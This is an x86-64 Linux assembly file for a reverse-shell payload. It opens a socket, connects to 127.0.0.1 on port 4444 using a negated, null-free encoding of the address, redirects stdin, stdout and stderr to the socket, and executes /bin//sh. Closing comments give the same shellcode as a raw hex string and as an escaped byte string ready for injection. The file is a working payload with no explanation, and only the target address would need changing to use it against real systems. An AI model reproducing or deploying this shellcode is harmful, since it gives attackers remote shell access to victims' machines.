global _start

BITS 64

_start:
    jmp socket

socket:
    xor rax, rax
    mov al, 0x29
    xor rdi, rdi
    mov dil, 2
    xor rsi, rsi
    mov sil, 1 ; sock stream
    xor rdx, rdx
    syscall
    mov r10, rax

connect:
    mov rdi, r10 ; fd of the sock
    xor rax, rax
    mov al, 42
    mov rcx, 0xfeffff80a3eefffe ; inverse of 127.0.0.1 4444
    neg rcx ;
    xor r9, r9 ; padding
    push r9
    push rcx
    push rsp
    pop rsi
    mov dl, 16
    syscall

dup2first:
    mov rdi, r10 ; fd
    xor rsi, rsi ; (newfd = STDIN)
    xor rax, rax
    mov al, 33
    syscall

dup2sec:
    mov rdi, r10
    xor rsi, rsi
    mov sil, 1 ; (newfd = STDOUT)
    xor rax, rax
    mov al, 33
    syscall

dup2third:
    mov rdi, r10
    xor rsi, rsi
    mov sil, 2 ; (newfd = STDERR)
    xor rax, rax
    mov al, 33
    syscall

execve:
    xor rax, rax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall

; eb004831c0b0294831ff40b7024831f640b6014831d20f054989c24c89d7
; 4831c0b02a48b9feffeea380fffffe48f7d94d31c9415151545eb2100f05
; 4c89d74831f64831c0b0210f054c89d74831f640b6014831c0b0210f054c
; 89d74831f640b6024831c0b0210f054831c05048bf2f62696e2f2f736857
; 4889e74831f64831d24831c0b03b0f05

; echo ne "\xeb\x00\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x49\x89\xc2\x4c\x89\xd7\x48\x31\xc0\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x4d\x31\xc9\x41\x51\x51\x54\x5e\xb2\x10\x0f\x05\x4c\x89\xd7\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x4c\x89\xd7\x48\x31\xf6\x40\xb6\x01\x48\x31\xc0\xb0\x21\x0f\x05\x4c\x89\xd7\x48\x31\xf6\x40\xb6\x02\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
